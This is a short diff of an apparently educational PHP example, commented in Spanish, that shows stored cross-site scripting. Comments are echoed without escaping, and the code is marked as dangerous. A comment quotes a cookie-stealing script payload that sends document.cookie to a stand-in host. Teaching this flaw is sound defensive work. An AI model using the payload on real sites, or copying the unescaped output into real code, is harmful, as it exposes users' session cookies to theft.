@@ -43,7 +43,9 @@ $pdo->prepare("INSERT INTO comentarios (texto) VALUES (?)")->execute([$comentari
 
 // PELIGROSO: se vuelve a mostrar despues, sin escapado
 foreach ($comentarios as $c) {
-    echo $c['texto'];  // si un atacante publico <script>document.location='https://robo.example/?c='+document.cookie</script>,
+    // si un atacante publico
+    // <script>document.location='https://robo.example/?c='+document.cookie</script>,
+    echo $c['texto'];
                         // ESTE CODIGO SE EJECUTA para CADA visitante que ve este comentario
 }
 
